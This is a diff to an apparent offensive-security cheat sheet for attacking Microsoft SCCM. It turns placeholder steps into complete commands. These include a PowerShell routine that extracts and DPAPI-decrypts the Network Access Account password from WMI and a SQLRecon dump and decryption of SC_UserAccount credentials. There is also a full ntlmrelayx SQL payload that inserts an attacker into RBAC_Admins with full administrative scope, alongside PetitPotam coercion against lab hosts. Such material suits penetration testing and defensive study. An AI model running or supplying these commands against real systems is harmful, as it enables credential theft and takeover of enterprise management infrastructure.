@@ -130,12 +130,14 @@ Get-WmiObject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_Netw
 # Decrypt using SharpSCCM
 .\SharpSCCM.exe local secrets -m wmi
 
-# Decrypt using SharpDPAPI
-$str = "060...F2DAF"
-$bytes = for($i=0; $i -lt $str.Length; $i++) {
-  [byte]::Parse($str.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber); $i++
+# Decrypt using SharpDPAPI — pull the blob directly out of WMI, strip the 4-byte header,
+# and pass it as base64 to SharpDPAPI
+$raw = (Get-WmiObject -Namespace "root\ccm\policy\Machine\ActualConfig" -Class CCM_NetworkAccessAccount).NetworkAccessPassword
+$hex = ($raw -replace '<!\[CDATA\[','' -replace '\]\]>','')
+$bytes = for ($i = 0; $i -lt $hex.Length; $i += 2) {
+  [byte]::Parse($hex.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber)
 }
-$b64 = [Convert]::ToBase64String($bytes[4..$bytes.Length])
+$b64 = [Convert]::ToBase64String($bytes[4..($bytes.Length - 1)])
 .\SharpDPAPI.exe blob /target:$b64 /mkfile:masterkeys.txt
 
 # Remote extraction via SCCMHunter
@@ -164,10 +166,12 @@ mimikatz# misc::sccm /connectionstring:"DRIVER={SQL Server};Trusted=true;DATABAS
 # Using SQLRecon
 SQLRecon.exe /auth:WinToken /host:CM1 /database:ConfigMgr_CHQ /module:sDecryptCredentials
 
-# Dump encrypted credentials from DB then decrypt
-SQLRecon.exe /auth:WinToken /host:<SITE-DB> /database:CM_<SITECODE> \
-  /module:query /command:"SELECT * FROM SC_UserAccount"
-sccmdecryptpoc.exe 0C010000080...5D6F0
+# Dump encrypted credentials from DB then decrypt.
+# The query returns UserName + encrypted Password (hex). Pipe the hex blob into sccmdecryptpoc.exe.
+SQLRecon.exe /auth:WinToken /host:CM1 /database:CM_CHQ \
+  /module:query /command:"SELECT UserName, Password FROM SC_UserAccount"
+# Copy the hex string from the Password column and pass it as the only argument:
+sccmdecryptpoc.exe 0C010000080F0000D08C9DDF0115D1118C7A00C04FC297EB0100000092A8F6A7E2B94C4FBC4F5D6F0AB31DDE
 ```
 
 ## CVE-2024-43468 — Unauthenticated SQL Injection
@@ -219,9 +223,10 @@ MalSCCM.exe group /delete /groupname:TargetGroup
 python3 sccmhunter.py mssql -u carol -p SCCMftw -d sccm.lab \
   -dc-ip 192.168.33.10 -tu carol -sc P01 -stacked
 
-# Set up NTLM relay to the MSSQL server
+# Set up NTLM relay to the MSSQL server.
+# Replace the AdminID with the value printed by `sccmhunter mssql --stacked` above.
 ntlmrelayx.py -smb2support -ts -t mssql://192.168.33.12 \
-  -q "USE CM_P01; INSERT INTO RBAC_Admins ..."
+  -q "USE CM_P01; INSERT INTO RBAC_Admins (AdminID, LogonName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite, DistinguishedName) VALUES (16777999, 'SCCM\\carol', 0, 0, 'SCCM\\carol', GETDATE(), 'SCCM\\carol', GETDATE(), 'P01', 'CN=carol,CN=Users,DC=sccm,DC=lab'); INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID) VALUES (16777999, 'SMS0001R', 'SMS00ALL', 29);"
 
 # Coerce authentication from site server
 petitpotam.py -d sccm.lab -u carol -p SCCMftw 192.168.33.1 192.168.33.11
